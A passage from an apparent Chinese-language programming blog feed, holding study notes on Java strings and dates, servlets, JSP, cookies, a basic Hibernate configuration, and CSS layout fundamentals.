class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String str1 = &quot;let there &quot;;</span><br><span class="line">StringBuffer sb = new StringBuffer(str1); //根据str1创建一个StringBuffer对象</span><br><span class="line">sb.append(&quot;be light&quot;); //在最后追加</span><br><span class="line">sb.delete(4, 10);//删除4-10之间的字符</span><br><span class="line">sb.insert(4, &quot;there &quot;);//在4这个位置插入 there</span><br><span class="line">sb.reverse(); //反转</span><br></pre></td></tr></table></figure><h2 id="字符串的转化"><a href="#字符串的转化" class="headerlink" title="字符串的转化"></a>字符串的转化</h2><h3 id="数字与字符串"><a href="#数字与字符串" class="headerlink" title="数字与字符串"></a>数字与字符串</h3><ul><li>数字转字符串<br>方法1： 使用String类的静态方法valueOf<br>String str = String.valueOf(i);<br>方法2： 先把基本类型装箱为对象，然后调用对象的toString<br>Integer it = i;<br>String str2 = it.toString();</li></ul><ul><li>字符串转数字<br>String str = “999”;<br>int i= Integer.parseInt(str);</li></ul><h3 id="字符串与字符串数组"><a href="#字符串与字符串数组" class="headerlink" title="字符串与字符串数组"></a>字符串与字符串数组</h3><ul><li>字符数组 转 字符串<br>char[] data={‘a’,’b’,’c’};<br>String s=new String(data);</li></ul><p>字符数组转换成字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char[]   data=&#123;&apos;a&apos;,&apos;b&apos;,&apos;c&apos;&#125;;   </span><br><span class="line">String  s=new   String(data);</span><br></pre></td></tr></table></figure></p><p>s1.charAt(0)=c1;是不行的<br>s1.charAt(0);是可以的</p><h2 id="字符串是否相等的提问"><a href="#字符串是否相等的提问" class="headerlink" title="字符串是否相等的提问"></a>字符串是否相等的提问</h2><p>问：1和2处分别输出什么?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> String str1 = &quot;the light&quot;;</span><br><span class="line"> String str2 = new String(str1);</span><br><span class="line"> System.out.println( str1  ==  str2);//1</span><br><span class="line">String str4 = new String(&quot;the light&quot;);//2</span><br><span class="line"></span><br><span class="line"> String str3 = &quot;the light&quot;;</span><br><span class="line"> String str4 = &quot;the light&quot;;</span><br><span class="line"> System.out.println( str4  ==  str3);//3</span><br></pre></td></tr></table></figure></p><p>答：1输出false。因为new String会为str2开辟一个新的区域.<br>2输出true。因为str3创建了一个新的字符串”the light”，在str4编译器发现已经存在现成的”the light”，那么就直接拿来使用，而没有进行重复创建</p><h1 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h1><h2 id="格式化时间"><a href="#格式化时间" class="headerlink" title="格式化时间"></a>格式化时间</h2><p>时间（注意月和小时是大写的喔）</p><p>y 代表年<br>M 代表月<br>d 代表日<br>H 代表24进制的小时<br>h 代表12进制的小时<br>m 代表分钟<br>s 代表秒<br>S 代表毫秒<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Date d = new Date();</span><br><span class="line">System.out.println(d);//输出当前时间</span><br><span class="line">SimpleDateFormat sdf = new SimpleDateFormat(&quot;yyyy年MM月dd日,HH时mm分ss秒&quot;);//设置样式</span><br><span class="line">String s = sdf.format(d);//把d这个时间实例格式化，并且赋值给字符串s</span><br><span class="line">System.out.println(s);//输出的字符串s就是格式化好的时间啦</span><br></pre></td></tr></table></figure></p><h2 id="日历（可以做“查看明年的今天是几号”之类的事）"><a href="#日历（可以做“查看明年的今天是几号”之类的事）" class="headerlink" title="日历（可以做“查看明年的今天是几号”之类的事）"></a>日历（可以做“查看明年的今天是几号”之类的事）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Calendar c = Calendar.getInstance();//Calendar用单例模式创造实例</span><br><span class="line">Date now = c.getTime();</span><br><span class="line"></span><br><span class="line">c.setTime(now);</span><br><span class="line">//先翻到下下个月</span><br><span class="line">c.add(Calendar.MONTH,2);</span><br><span class="line">//设置到月初</span><br><span class="line">c.set(Calendar.DATE,1);</span><br><span class="line">//再往回翻3天</span><br><span class="line">c.add(Calendar.DATE,-3);</span><br><span class="line"></span><br><span class="line">System.out.println(&quot;下个月的倒数第3天是哪天&quot;+s);</span><br></pre></td></tr></table></figure><h1 id="一些基础但不重要的知识"><a href="#一些基础但不重要的知识" class="headerlink" title="一些基础但不重要的知识"></a>一些基础但不重要的知识</h1><ul><li>变量名起名规则<ol><li>字母 数字 $ _ 组成</li><li>变量第一个字符，不能使用数字。</li><li>不可以使用关键字。<br>为什么不重要？<br>起名的时候选择有意义描述性的词比如“toString””getFlow”，不要用关键字。起名规则无需死记硬背。</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>javaEE</title>
      <link href="/2018/10/04/javaweb/"/>
      <url>/2018/10/04/javaweb/</url>
      
        <content type="html"><![CDATA[<h1 id="javabean"><a href="#javabean" class="headerlink" title="javabean"></a>javabean</h1><p>三要素<br>1.一个无参的构造函数<br>2.属性私有化。<br>3.get、set的方法。私有化的属性必须通过public类型的方法给其它程序，并且方法的命名也必须遵守一定的命名规范。</p><h1 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h1><h2 id="写一个servlet"><a href="#写一个servlet" class="headerlink" title="写一个servlet"></a>写一个servlet</h2><p>第一步：html表单提交请求<br><code>&lt;form action=&quot;login&quot; method=&quot;post&quot;&gt;</code></p><p>第二步：servlet类中的请求处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public class LoginServlet extends HttpServlet &#123;</span><br><span class="line">    protected void doPost(HttpServletRequest request, HttpServletResponse response)</span><br></pre></td></tr></table></figure></p><p>第三步：配置web.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-name&gt;L1&lt;/servlet-name&gt;//类的缩写</span><br><span class="line">    &lt;servlet-class&gt;Myservlet.LoginServlet&lt;/servlet-class&gt;//类的名称</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;L1&lt;/servlet-name&gt;//类的缩写，和上面一致就行</span><br><span class="line">    &lt;url-pattern&gt;/login&lt;/url-pattern&gt;//映射为的url地址，注意有“/”。对应&lt;form action=&quot;login&quot;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure></p><h2 id="处理请求的三种方法"><a href="#处理请求的三种方法" class="headerlink" title="处理请求的三种方法"></a>处理请求的三种方法</h2><p>1、dopost、doget、service<br>doget：是默认方法，比如超链访问、地址栏直接输入某个地址。<br>特点：1.不安全，提交数据会在浏览器地址栏显示出来<br>2.不可以上传文件<br>3.有大小的限制</p><p>dopost：一般用于注册、修改请求<br>特点：1.安全<br>2.可以上传文件<br>3.没有限制</p><h2 id="request和reponse常用方法"><a href="#request和reponse常用方法" class="headerlink" title="request和reponse常用方法"></a>request和reponse常用方法</h2><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p><strong>request.getParameter(): 是常见的方法，用于获取单值的参数</strong><br>request.getParameterValues(): 用于获取具有多值得参数，比如注册的时候提交的爱好，可以使多选的。<br>request.getParameterMap(): 用于遍历所有的参数，并返回Map类型。</p><p>request.getRequestURL(): 浏览器发出请求时的完整URL，包括协议 主机名 端口(如果有)” +<br>request.getRequestURI(): 浏览器发出请求的资源名部分，去掉了协议和主机名” +<br>request.getQueryString(): 请求行中的参数部分，只能显示以get方式发出的参数，post方式的看不到<br>request.getRemoteAddr(): 浏览器所处于的客户机的IP地址<br>request.getRemoteHost(): 浏览器所处于的客户机的主机名<br>request.getRemotePort(): 浏览器所处于的客户机使用的网络端口<br>request.getLocalAddr(): 服务器的IP地址<br>request.getLocalName(): 服务器的主机名<br>request.getMethod(): 得到客户机请求方式一般是GET或者POST</p><p>request.getHeader() 获取浏览器传递过来的头信息。比如getHeader(“user-agent”) 可以获取浏览器的基本资料，这样就能判断是firefox、IE、chrome、或者是safari浏览器<br>request.getHeaderNames() 获取浏览器所有的头信息名称，根据头信息名称就能遍历出所有的头信息</p><h3 id="reponse-待完善"><a href="#reponse-待完善" class="headerlink" title="reponse(待完善)"></a>reponse(待完善)</h3><p>用于提供给浏览器的响应信息</p><h2 id="服务端跳转和客户端跳转"><a href="#服务端跳转和客户端跳转" class="headerlink" title="服务端跳转和客户端跳转"></a>服务端跳转和客户端跳转</h2><p>服务端跳转<br><code>request.getRequestDispatcher(&quot;success.html&quot;).forward(request, response);</code></p><p>客户端跳转<br><code>response.sendRedirect(&quot;fail.html&quot;);</code></p><p>区别在于<strong>客户端跳转时</strong>候浏览器地址发生了变化</p><h2 id="中文问题"><a href="#中文问题" class="headerlink" title="中文问题"></a>中文问题</h2><h3 id="获取中文参数，只需三步"><a href="#获取中文参数，只需三步" class="headerlink" title="获取中文参数，只需三步"></a>获取中文参数，只需三步</h3><ol><li>login.html中加上</li></ol><p><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</code></p><p>这句话的目的是告诉浏览器，等下发消息给服务器的时候，使用UTF-8编码</p><ol start="2"><li><p>login.html<br>form的method修改为post</p></li><li><p>在servlet进行解码和编码<br>把下面这句代码放在request.getParameter()之前<br><code>request.setCharacterEncoding(&quot;UTF-8&quot;);</code><br>这句话的目的UTF-8解码，然后用UTF-8编码</p></li></ol><h3 id="返回中文的响应"><a href="#返回中文的响应" class="headerlink" title="返回中文的响应"></a>返回中文的响应</h3><p>在Servlet中，加上<br><code>response.setContentType(&quot;text/html; charset=UTF-8&quot;);</code></p><h2 id="servlet的一些概念"><a href="#servlet的一些概念" class="headerlink" title="servlet的一些概念"></a>servlet的一些概念</h2><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>servlet生命周期有5步：实例化，初始化，提供服务，销毁，被回收<br>初始化：（ init(ServletConfig) 实例方法，只会执行一次）<br>LoginSerlvet构造方法 只会执行一次，所以Serlvet是单实例的</p><h2 id="servlet和jsp"><a href="#servlet和jsp" class="headerlink" title="servlet和jsp"></a>servlet和jsp</h2><p>jsp就是在html里面写java代码，servlet就是在java里面写html代码</p><p>jsp更注重前端显示，servlet更注重模型和业务逻辑</p><p>jsp经过容器解释之后就是一个servlet类.<br>我们说HelloServlet是一个Servlet，不是因为它的类名里有一个”Servlet”，而是因为它继承了 HttpServlet<br>打开转译hello.jsp 后得到的hello_jsp.java，可以发现它继承了类HttpJspBase，而HttpJspBase 继承了HttpServlet<br>所以我们说hello_.jsp.java 是一个Servlet</p><h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><h2 id="页面元素"><a href="#页面元素" class="headerlink" title="页面元素"></a>页面元素</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1. 静态内容</span><br><span class="line">就是html,css,javascript等内容</span><br><span class="line">2. 指令</span><br><span class="line">以&lt;%@开始 %&gt; 结尾，比如&lt;%@page import=&quot;java.util.*&quot;%&gt;</span><br><span class="line">3. 表达式 &lt;%=%&gt;</span><br><span class="line">4. Scriptlet</span><br><span class="line">在&lt;%%&gt; 之间，可以写任何java 代码</span><br><span class="line">5. 声明</span><br><span class="line">在&lt;%!%&gt; 之间可以声明字段或者方法。但是不建议这么做。</span><br><span class="line">6. 动作</span><br><span class="line">&lt;jsp:include page=&quot;Filename&quot; &gt; 在jsp页面中包含另一个页面。在包含的章节有详细的讲解</span><br><span class="line">7. 注释 &lt;%-- -- %&gt;</span><br><span class="line">不同于 html的注释 &lt;!-- --&gt; 通过jsp的注释，浏览器也看不到相应的代码，相当于在servlet中注释掉了</span><br><span class="line"></span><br><span class="line">8. 表达式</span><br><span class="line">用于输出一段html，比如&lt;%=&quot;hello jsp&quot;%&gt;相当于&lt;%out.println(&quot;hello jsp&quot;);%&gt;</span><br><span class="line">再比如</span><br><span class="line">&lt;%for (String word : words) &#123;%&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">    &lt;td&gt;&lt;%=word%&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;%&#125;%&gt;</span><br></pre></td></tr></table></figure><h2 id="九大内置对象"><a href="#九大内置对象" class="headerlink" title="九大内置对象"></a>九大内置对象</h2><p>request,response,out</p><p>pageContext, session,application作用域：页面、用户、全局</p><p>page,config,exception</p><p>使用javabean</p><h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><p>设置<br><code>session.getAttribute(&quot;name&quot;);</code><br>取得<br><code>String name = (String)session.getAttribute(&quot;name&quot;);</code></p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//创健</span><br><span class="line">Cookie u= new Cookie(&quot;username&quot;,username);键，值对的关系存储`</span><br><span class="line">//设置生存时间</span><br><span class="line">u.setMaxAge(864000);`</span><br><span class="line">//保存 </span><br><span class="line">response.addCookie(u);`</span><br><span class="line"></span><br><span class="line">//把所有cookie取出来装入数组 Cookie[] cookies = request.getCookies();</span><br><span class="line">if(c.getName().equals(&quot;username&quot;)||c.getName().equals(&quot;password&quot;))</span><br><span class="line">  &#123;c.setMaxAge(0); //设置Cookie失效</span><br><span class="line">  response.addCookie(c); //重新保存。</span><br><span class="line"></span><br><span class="line">//取键 </span><br><span class="line">if(c.getName().equals(&quot;username&quot;))</span><br><span class="line"> </span><br><span class="line">//取值</span><br><span class="line">username = URLDecoder.decode(c.getValue(),&quot;utf-8&quot;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hibernate简单入门</title>
      <link href="/2018/09/27/Hibernate/"/>
      <url>/2018/09/27/Hibernate/</url>
      
        <content type="html"><![CDATA[<h1 id="Hibernate简单入门"><a href="#Hibernate简单入门" class="headerlink" title="Hibernate简单入门"></a>Hibernate简单入门</h1><p>用这个框架，只需要三步。配置Product.hbm.xml文件和hibernate.cfg.xml文件、编写测试类</p><h2 id="Product-hbm-xml文件"><a href="#Product-hbm-xml文件" class="headerlink" title="Product.hbm.xml文件"></a>Product.hbm.xml文件</h2><p>作用是将javabean对应数据库中的表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">   &lt;!DOCTYPE hibernate-mapping PUBLIC</span><br><span class="line">           &quot;-//Hibernate/Hibernate Mapping DTD 3.0//EN&quot;</span><br><span class="line">           &quot;http://www.hibernate.org/dtd/hibernate-mapping-3.0.dtd&quot;&gt;</span><br><span class="line">    </span><br><span class="line">   &lt;hibernate-mapping package=&quot;com.how2java.pojo&quot;&gt;</span><br><span class="line">       &lt;class name=&quot;Product&quot; table=&quot;product_&quot;&gt;//表示类Product对应表product_</span><br><span class="line"></span><br><span class="line">           &lt;id name=&quot;id&quot; column=&quot;id&quot;&gt;//表示属性id,映射表里的字段id</span><br><span class="line">               &lt;generator class=&quot;native&quot;&gt;//意味着id的自增长方式采用数据库的本地方式</span><br><span class="line">               &lt;/generator&gt;</span><br><span class="line">           &lt;/id&gt;</span><br><span class="line">           &lt;property name=&quot;name&quot; /&gt;//这里没有通过column=&quot;name&quot; 显式的指定字段），因为属性和字段同名</span><br><span class="line">           &lt;property name=&quot;price&quot; /&gt;</span><br><span class="line">       &lt;/class&gt;</span><br><span class="line">        </span><br><span class="line">   &lt;/hibernate-mapping&gt;</span><br></pre></td></tr></table></figure></p><h2 id="hibernate-cfg-xml文件"><a href="#hibernate-cfg-xml文件" class="headerlink" title="hibernate.cfg.xml文件"></a>hibernate.cfg.xml文件</h2><p>访问数据库配置。注意，这个文件要放在<strong>src目录</strong>下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos; encoding=&apos;utf-8&apos;?&gt;</span><br><span class="line">&lt;!DOCTYPE hibernate-configuration PUBLIC</span><br><span class="line">       &quot;-//Hibernate/Hibernate Configuration DTD 3.0//EN&quot;</span><br><span class="line">&quot;http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd&quot;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;hibernate-configuration&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;session-factory&gt;</span><br><span class="line">        &lt;!-- Database connection settings --&gt;</span><br><span class="line">        &lt;property name=&quot;connection.driver_class&quot;&gt;com.mysql.jdbc.Driver&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;connection.url&quot;&gt;jdbc:mysql://localhost:3306/test?characterEncoding=UTF-8&lt;/property&gt;//这表示使用MYSQL方言</span><br><span class="line">        &lt;property name=&quot;connection.username&quot;&gt;root&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;connection.password&quot;&gt;admin&lt;/property&gt;</span><br><span class="line">        &lt;!-- SQL dialect --&gt;</span><br><span class="line">        &lt;property name=&quot;dialect&quot;&gt;org.hibernate.dialect.MySQLDialect&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;current_session_context_class&quot;&gt;thread&lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;show_sql&quot;&gt;true&lt;/property&gt;//这表示是否在控制台显示执行的sql语句</span><br><span class="line">        &lt;property name=&quot;hbm2ddl.auto&quot;&gt;update&lt;/property&gt;//这表示是否会自动更新数据库的表结构，有这句话Hibernate会自动去创建表结构</span><br><span class="line">        &lt;mapping resource=&quot;com/how2java/pojo/Product.hbm.xml&quot; /&gt;//识别Product这个实体类</span><br><span class="line">    &lt;/session-factory&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/hibernate-configuration&gt;</span><br></pre></td></tr></table></figure></p><h2 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h2><p>hibernate的基本步骤是：</p><ol><li>获取SessionFactory </li><li>通过SessionFactory 获取一个Session</li><li>在Session基础上开启一个事务</li><li>通过调用Session的save方法把对象保存到数据库</li><li>提交事务</li><li>关闭Session</li><li>关闭SessionFactory<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SessionFactory sf = new Configuration().configure().buildSessionFactory();//1.获取SessionFactory</span><br><span class="line"></span><br><span class="line">Session s = sf.openSession();//2.通过SessionFactory 获取一个Session</span><br><span class="line">s.beginTransaction();//3.在Session基础上开启一个事务</span><br><span class="line"></span><br><span class="line">Product p = new Product();</span><br><span class="line">p.setName(&quot;iphone7&quot;);</span><br><span class="line">p.setPrice(7000);</span><br><span class="line">s.save(p);//4. 通过调用Session的save方法把对象保存到数据库</span><br><span class="line"></span><br><span class="line">s.getTransaction().commit();//5. 提交事务</span><br><span class="line">s.close();//6. 关闭Session</span><br><span class="line">sf.close();//7. 关闭SessionFactory</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSS拾遗</title>
      <link href="/2018/09/18/css/"/>
      <url>/2018/09/18/css/</url>
      
        <content type="html"><![CDATA[<h1 id="css的三种写处"><a href="#css的三种写处" class="headerlink" title="css的三种写处"></a>css的三种写处</h1><h2 id="内联式"><a href="#内联式" class="headerlink" title="内联式"></a>内联式</h2><p><code>style=&quot;color:red;&quot;</code></p><h2 id="嵌入式"><a href="#嵌入式" class="headerlink" title="嵌入式"></a>嵌入式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="外部式"><a href="#外部式" class="headerlink" title="外部式"></a>外部式</h2><p>css外部式<br><code>&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</code></p><p>js外部式<br><code>&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt;</code></p><h2 id="优先级：内联式-gt-嵌入式-gt-外部式"><a href="#优先级：内联式-gt-嵌入式-gt-外部式" class="headerlink" title="优先级：内联式 &gt; 嵌入式 &gt; 外部式"></a>优先级：内联式 &gt; 嵌入式 &gt; 外部式</h2><p>其实总结来说，就是–就近原则（离被设置元素越近优先级别越高）。</p><h1 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p&#123; color:red;&#125;/*元素选择器*/</span><br><span class="line"></span><br><span class="line">#p1&#123;color:blue;&#125;/*id选择器*/</span><br><span class="line"></span><br><span class="line">.after&#123;color:green; &#125;/*类选择器*/</span><br><span class="line"></span><br><span class="line">*&#123;color:red;&#125;/*通用选择器*/</span><br><span class="line"></span><br><span class="line">a:hover&#123;color:red;&#125;/*伪类选择器*/</span><br><span class="line"></span><br><span class="line"> h1,span&#123;color:red;&#125;/*两个都*/</span><br></pre></td></tr></table></figure><p>选择官方参考手册<a href="http://www.w3school.com.cn/cssref/css_selectors.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/cssref/css_selectors.asp</a></p><p>!important 注意要写在分号的前面，比如<br><code>a:hover{color:red!important;}/</code></p><h1 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h1><p>这个慕课老师发了许多关于布局的课程，其中一些给人启发<br><a href="http://www.imooc.com/t/197450" target="_blank" rel="noopener">http://www.imooc.com/t/197450</a></p><h2 id="一、基本知识"><a href="#一、基本知识" class="headerlink" title="一、基本知识"></a>一、基本知识</h2><ul><li>块级元素<br>特点：<br>1.一个块级元素独占一行<br>2.元素的高度、宽度、行高以及顶和底边距都可设置。<br>常用的块状元素有：<br><code>&lt;div&gt;、&lt;p&gt;、&lt;h1&gt;、&lt;h6&gt;、&lt;ol&gt;、&lt;ul&gt;、&lt;dl&gt;、&lt;table&gt;、&lt;address&gt;、&lt;blockquote&gt; 、&lt;form&gt;</code></li></ul><ul><li>内联元素<br>特点：<br>1.和其他元素都在一行上。<br>2.元素的高度、宽度及顶部和底部边距<strong>不可</strong>设置；<br>常用的内联元素有：<br><code>&lt;a&gt;、&lt;span&gt;、&lt;br&gt;、&lt;i&gt;、&lt;em&gt;、&lt;strong&gt;、&lt;label&gt;、&lt;q&gt;、&lt;var&gt;、&lt;cite&gt;、&lt;code&gt;</code></li></ul><p>inline-block 元素特点：<br>1、和其他元素都在一行上；<br>2、元素的高度、宽度、行高以及顶和底边距都<strong>可</strong>设置。</p><p>display:block  – 显示为块级元素<br>display:inline  – 显示为内联元素<br>display:inline-block – 显示为内联块元素，表现为同行显示并可修改宽高内外边距等属性</p><p>tips：常将<ul>元素加上display:inline-block样式，原本垂直的列表就可以水平显示了。</ul></p><h2 id="二、定位"><a href="#二、定位" class="headerlink" title="二、定位"></a>二、定位</h2><h3 id="float浮动定位"><a href="#float浮动定位" class="headerlink" title="float浮动定位"></a>float浮动定位</h3><p>float的设计初衷仅仅是-文字环绕效果<br>属性有left、right、none</p><h3 id="positioin"><a href="#positioin" class="headerlink" title="positioin"></a>positioin</h3><p>relative相对定位：相对于它的初始位置而言移动。不可层叠。<br>absolute绝对定位：相对于最近的已定位的父元素。可层叠。<br>fixed悬浮定位：本质和absolute一样，不过不随浏览器滚动条向上或向下移动。</p><h2 id="三、盒模型"><a href="#三、盒模型" class="headerlink" title="三、盒模型"></a>三、盒模型</h2><p>元素实际宽度（盒子的宽度）=左边界+左边框+左填充+内容宽度+右填充+右边框+右边界。</p><h2 id="四、布局模型"><a href="#四、布局模型" class="headerlink" title="四、布局模型"></a>四、布局模型</h2><p>  1、流动模型（Flow）</p><p>  2、浮动模型 (Float)<br>  float的设计初衷仅仅是-文字环绕效果<br>  3、层模型（Layer）</p><h1 id="静态网页常用代码"><a href="#静态网页常用代码" class="headerlink" title="静态网页常用代码"></a>静态网页常用代码</h1><h2 id="1-如何将网页整体居中？"><a href="#1-如何将网页整体居中？" class="headerlink" title="1.如何将网页整体居中？"></a>1.如何将网页整体居中？</h2><ul><li>方法一将整个网页放在一个大div容器下，容器设置margin和具体宽度。<br><code>&lt;div style=&quot;margin: 0 auto;width:1000px;&quot;&gt;</code><br>解释：上下边距为0，左右边距为自适应。</li><li>方法二1.定义大div的宽度 2.把容器position睡醒设置为relative 3.把left属性设置为50%<br><code>&lt;div style=&quot;width:1000px;position:relative;left:50%;&quot;&gt;</code></li></ul><h2 id="2-如何消除默认样式？"><a href="#2-如何消除默认样式？" class="headerlink" title="2.如何消除默认样式？"></a>2.如何消除默认样式？</h2><p><code>2.&lt;body style=&quot;margin:0;padding:0;&quot;&gt;</code></p><h2 id="3-如何隐藏滚动条？"><a href="#3-如何隐藏滚动条？" class="headerlink" title="3.如何隐藏滚动条？"></a>3.如何隐藏滚动条？</h2><ul><li><p>方法一html { overflow-y: scroll; }<br> 原理：强制显示ie的垂直滚动条，而忽略水平滚动条<br> 优点：完全解决了这个问题, 允许你保持完整的XHTML doctype.<br> 缺点：即使页面不需要垂直滚动条的时候也会出现垂直滚动条。</p></li><li><p>方法2:html { overflow-x: hidden; overflow-y: auto; }<br> 原理：隐藏横向滚动，垂直滚动根据内容自适应<br> 优点：在视觉上解决了这个问题.在不必要的时候, 未强制垂直滚动条出现.<br> 缺点：只是隐藏了水平滚动条，如果页面真正需要水平滚动条的时候，<br> 屏幕以外的内容会因为用户无法水平滚动，而看不到。</p></li></ul><h2 id="4-常用代码，搁这了，方便复制。"><a href="#4-常用代码，搁这了，方便复制。" class="headerlink" title="4.常用代码，搁这了，方便复制。"></a>4.常用代码，搁这了，方便复制。</h2><ul><li><p>清除一些默认样式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*&#123;margin:0;padding:0;&#125;</span><br><span class="line">body&#123;font-size:12px;&#125;</span><br><span class="line">img&#123;border:none;&#125;</span><br><span class="line">li&#123;list-style:none;&#125;</span><br><span class="line">input,select,textarea&#123;outline:none;&#125;</span><br><span class="line">textarea&#123;resize:none;&#125;</span><br><span class="line">a&#123;text-decoration:none;&#125;</span><br></pre></td></tr></table></figure></li><li><p>刚开始肯定就是刷刷几个div包起来</p><figure class="highlight plain"><table><tr><td 